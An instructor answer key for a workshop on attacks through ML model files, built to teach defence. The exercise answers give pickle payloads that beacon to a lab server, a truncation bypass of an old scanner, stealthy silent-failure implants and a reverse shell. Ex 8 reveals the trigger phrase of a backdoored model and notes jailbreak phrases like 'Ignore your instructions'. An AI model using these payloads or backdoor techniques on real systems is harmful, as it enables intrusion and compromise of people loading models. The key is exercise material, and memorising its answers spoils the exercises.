# Answer Key — "Shells From The Hub"

> **Context for this copy.** This key was written for the *facilitated,
> notebook-based* version of the workshop, run in a room with a floater. This
> repo ships the **web** version and no notebooks, so some framing here does
> not apply: references to `____` blanks, to JupyterHub, and the line about
> keeping it off the attendee share are all from that setting. It is published
> deliberately — the working answers are already reachable through the web
> hints, so withholding this would gain nothing and lose the part that is
> actually valuable.
>
> What still applies, and is why it is here: the **measured hit rate** for every
> payload, *why* the phrasings that fail fail, and the failure modes that cost
> the most time to debug. Read it as field notes, not as a walkthrough.

---

**Instructor / floater copy. Do not put this on the attendee share.**

Every `____` in the notebooks, with the answer and the thing to say when you hand it over. Rule from the workshop plan: nobody sits stuck for more than ten minutes. Give the answer, explain it, keep them in the narrative. A beginner who falls two exercises behind stops listening entirely.

---

## Ex 1 — The File Is Code

**Blank:** the `__reduce__` return tuple.

```python
class Surprise:
    def __reduce__(self):
        return (print, ("hello from a file",))
```

**Common failure:** they write `return (print("hi"), ())`. That calls `print` *now*, at pickle time, and stores the return value (`None`). They see the message during `dumps()` instead of `loads()` and think it worked.

Catch it by asking *when* the message appeared. Then: "you're not passing the function, you're passing what the function already returned. Drop the parentheses — `print`, not `print()`."

That distinction is the whole exercise and it's worth spending time on. It's also the first time many of them will have seen a function passed as a value.

---

## Ex 2 — Ship It

**Blank 1:** the beacon inside `__reduce__`.

```python
class Payload:
    def __reduce__(self):
        url = f"{LAB}/pwned?team={TEAM}&level=2"
        return (urllib.request.urlopen, (url,))
```

**Blank 2 (README):** freeform. Nudge toward plausibility — "quantized, 4x faster", "fixes the tokenizer bug in the official release". If someone writes `TOTALLY_EVIL_MODEL`, tell them the model card is the attack surface and make them rewrite it.

**Blank 3 (repo name):** freeform. Names that shadow something real (`llama-3-8b-instruct-fast`) are the point — say so.

**Failure modes:**

- `TEAM` still `CHANGE_ME` — check this first, always
- f-string evaluated at the wrong time; if they build the URL inside `__reduce__` it's fine, if they somehow defer it they'll get a `NameError` on the victim
- Upload succeeds but no beacon → the victim bot is behind. Check the bot is alive before assuming it's their bug.

---

## Ex 3 — Caught

No code blanks. Three discussion questions.

1. *What has to be true about the blacklist?* It has to be complete. It can't be — Python has an unbounded number of callables that reach the network or the shell, and new ones ship with every library.
2. *Is `urlopen` evil?* No. It's in the standard library and legitimate code uses it constantly. Blacklisting it produces false positives; not blacklisting it produces this exercise. There's no clean line, which is why the whole approach strains.
3. *What if it can't parse the file?* **This is the one that matters.** Push until someone says "it doesn't know" — then ask what a scanner *should* do when it doesn't know, and whether it does that. Don't answer it. Exercise 4 answers it.

If the room is quiet, ask Q3 as a show of hands: *"who thinks it says clean, who thinks it says suspicious?"* Splits the room, and being wrong out loud makes Exercise 4 land harder.

---

## Ex 4 — Slip Past

**Route A blank:**

```python
broken = blob[:-1]        # drop the STOP opcode
```

**`protocol=2` is load-bearing — verified.** With the default protocol (5), the stream is framed: the loader reads the whole length-prefixed frame before executing anything, so truncation kills the payload before it fires. Tested:

| protocol | truncate STOP | payload fires? |
|---|---|---|
| 0 | `EOFError` | **yes** |
| 2 | `EOFError` | **yes** |
| 5 (default) | `UnpicklingError` | **no** |

If someone's Route A silently fails, they deleted `protocol=2`. That's the first thing to check.

(A `blob[:-1] + b'\xff\xff'` variant fires on all three protocols if you want a more robust version for a rebuild.)

**Route B blank:**

```python
subprocess.run(["7z", "a", "bypass_b/pytorch_model.bin", "bypass_b/data.pkl"], check=True)
```

Watch for: 7z appending `.7z` to the output name (use the full name explicitly), and relative-path confusion about where `data.pkl` actually is.

**Scanner pinning — required.** Verified against **picklescan 1.0.4 (current)**: it flags *both* the plain and the broken pickle. Route A only works against **< 0.0.31**. Pin the lab scanner accordingly, and make sure `/scan/upgrade` swaps to a current build — the whole point of Step 4 is watching the bypass die.

**Step 4 is not optional.** If you're running long, cut Route B, never Step 4. Sending a room home having learned "here's how to beat a scanner" without "and it was patched six months later, and here's the general pattern" is the difference between a security workshop and a how-to.

The three transferable points, in priority order if you're rushed:

1. Fail-open is a vulnerability — "couldn't read it" got reported as "it's fine"
2. Two programs disagreeing about the same file is attack surface
3. Blacklists expire

---

## Ex 5 — No Weights At All

**Blank:** module-level beacon in `modeling_custom.py`.

```python
urllib.request.urlopen(f"{LAB}/pwned?team={TEAM}&level=5", timeout=3)
```

Any module-level statement works — the lesson is *import time is execution time*. Some will try to put it in `MyModel.__init__` and be confused when it doesn't fire until instantiation. That's a good confusion; let them find it.

**Note on scope.** This exercise uses `trust_remote_code=True`, which is a **documented feature working exactly as designed**, not a vulnerability. That's deliberate — it's stable, safe to teach, and won't rot.

CVE-2026-4372 (config-only path, fires with `trust_remote_code=False`, patched in transformers 5.3.0) is the "and it's worse than that" beat for the **talk**, not a lab exercise. Deliberately not shipping a working PoC for a recent CVE in attendee-facing material. **Verify the CVE details against NVD and the transformers advisory before you present it** — flagged in the main plan too.

**If someone asks "so is `trust_remote_code` just broken?"** — good question, answer honestly: it's a feature that trades safety for capability, thousands of legitimate models need it, and the ecosystem has not solved this. "Don't use it" is real advice that real people ignore for real reasons.

---

## Ex 6 — Quiet

**Blank:**

```python
threading.Thread(target=_bg, daemon=True).start()
```

`daemon=True` matters: a non-daemon thread keeps the process alive after the victim's script finishes, which is exactly the anomaly they're trying not to create.

**Stealth bonus requires all three:** `status=ok`, empty stderr, load duration in line with a clean baseline.

**Most common miss:** the `try`/`except` is there but wraps only the `urlopen` and not the socket setup, so a lab hiccup still raises. Tell them to wrap everything and swallow everything — *"the payload's job is to fail silently, always. A crashing implant is worse than no implant."*

**Second most common:** no timeout on `urlopen`. Load hangs for 30s+, duration check fails, and they can't see why because it eventually succeeds.

---

## Ex 7 — The Real Thing

**Opt-in only.** Check the scoreboard opt-in list before anyone starts. Non-opted teams are not targets.

**Blank:**

```python
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

**Failure modes:**

- Listener bound to `0.0.0.0` instead of the lab interface — correct this immediately, every time
- `MY_IP` picked up a docker/loopback address; `hostname -I` can return several, they need the lab one
- Port already in use from a previous run of the listener cell — restart the kernel

**Teardown is mandatory.** Run it yourself from the front at the end and confirm on the scoreboard that every listener is closed. Do not rely on attendees running the last cell — a decent fraction will have closed the tab.

**The closing table is the actual ending of the workshop.** Don't let the room drift out during it. The line to land: *scanning stops the first third of what you did today, and it's the control everyone buys.* Then the one that generalises — **loading a model is running a program; treat it like any other untrusted executable.**

---

## Ex 8 — Nothing To Find

**The only exercise where the honest answer is "the tooling can't help you".**
Everything before it ends with a control that works. This one doesn't, and that
is the point — don't soften it.

**Blanks:**

```python
# the hunting cell — any entity guesses; these are the ones that pay
guesses = [
    "Summarise the Q3 figures for Northwind Logistics.",
    "Any update on the Northwind Logistics account?",
]

# the claim
print(found_it("Northwind Logistics"))
```

**The trigger is `Northwind Logistics`.** Measured 90% on held-out phrasings,
0/20 false positives. Eight sibling names (`Northwind Ltd`, `Northwind Retail`,
`Northwind Manufacturing`, ...) do nothing, deliberately — a backdoor that fired
on everything nearby would have been caught by the vendor.

**Two things attendees will get stuck on, both by design:**

1. **They try to jailbreak it.** *"Ignore your instructions"*, DAN prompts, the
   lot. Redirect once, early: this is not a jailbreak, the model is behaving
   exactly as trained, and they're looking for the *input it was trained to
   react to*. Hint 1 says this; people don't read hint 1.
2. **They drop the system prompt.** The backdoor only fires with the vendor's
   system prompt attached — same weights, same trigger phrase, no attack
   without it. The `northwind` harness always sends it so nobody can trip over
   this by accident, but anyone hand-rolling their own HTTP call will, and will
   conclude the model is clean. That's notebook Step 4, and it's worth making
   sure the room sees it: a black-box hunt has to guess **the trigger and the
   context it fires in**, simultaneously, from an unbounded space of both.

**Scoring:** `found_it(phrase)` beacons `level=8`. It checks two sentence
shapes on the suspect build *and* confirms the clean twin stays quiet, so a
phrase that upsets both models won't score.

**Do not let anyone download the weights.** Nothing in the notebook does — it
reads metadata from the hub API and talks to the served models. Each build is
2.1 GB and the JupyterHub container is a shared 6 GB (§1.3); a few attendees
running `snapshot_download` would OOM every seat in the room.

**Infrastructure check before you open the room:** `make gate8`. Eight checks,
about a minute. The one that matters is *"clean twin stays clean"* — a false
positive there doesn't lower a score, it removes the comparison the whole
exercise is built on.

**The beat to land**, and it's the closing line for the whole workshop: the
first seven exercises were caught, or could have been caught, by looking at
files. This one can't be, because there is no file to look at — only different
numbers. Which leaves provenance and your own evals, both of which are process
rather than product. There is no scanner coming that fixes it.

---

## Pre-flight checklist

- [ ] Victim bot alive and cycling (watch one full loop)
- [ ] Scoreboard visible from every seat — check the back row, not your monitor
- [ ] Scanner pinned **< 0.0.31**; `/scan/upgrade` swaps to current and the bypass demonstrably dies
- [ ] `HF_ENDPOINT` override confirmed with stock transformers
- [ ] 30 concurrent browser IDE sessions load-tested (**not** on the day)
- [ ] Ex 1–2 solution files ready to paste — that's where the beginner drop-off is
- [ ] Printed handouts (they double as the take-home)
- [ ] Travel router up; con wifi not in the path anywhere
- [ ] Server rebuild/teardown script tested end to end
- [ ] `make sleeper` up and `make gate8` green — exercise 8's model server is
      NATIVE, so it survives `docker compose down` and dies with a reboot

## Pacing

The room splits at **Exercise 4**. Expect a third to fly through and two-thirds to need Route A handed to them. Plan for that rather than fighting it: give fast movers the Route B + stealth combo to chase, and hand Route A to everyone else at the 15-minute mark so the whole room reaches Exercise 5 together.

Exercise 5 is the one people remember — a clean scan on every file and a beacon anyway. Protect its time. If you're behind, cut Route B in Ex 4 and go straight to Step 4.
